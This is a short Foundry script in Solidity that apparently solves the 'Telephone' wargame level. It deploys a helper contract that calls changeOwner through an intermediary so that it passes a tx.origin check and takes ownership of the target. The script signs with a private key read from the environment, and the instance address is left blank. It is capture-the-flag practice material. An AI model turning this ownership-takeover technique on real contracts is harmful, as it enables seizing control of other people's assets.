// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/04-Telephone.sol";



contract Exploit {
    
    function run(Telephone TelephoneInstance) public {
        TelephoneInstance.changeOwner(msg.sender);
  }
}

contract Exp is Script {

    Telephone public TelephoneInstance = Telephone(payable(/*获取的实例地址*/));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    Exploit public exploit;



    function run() external {
        vm.startBroadcast(hacker);

        exploit = new Exploit();
        exploit.run(TelephoneInstance);

        vm.stopBroadcast();
    }


}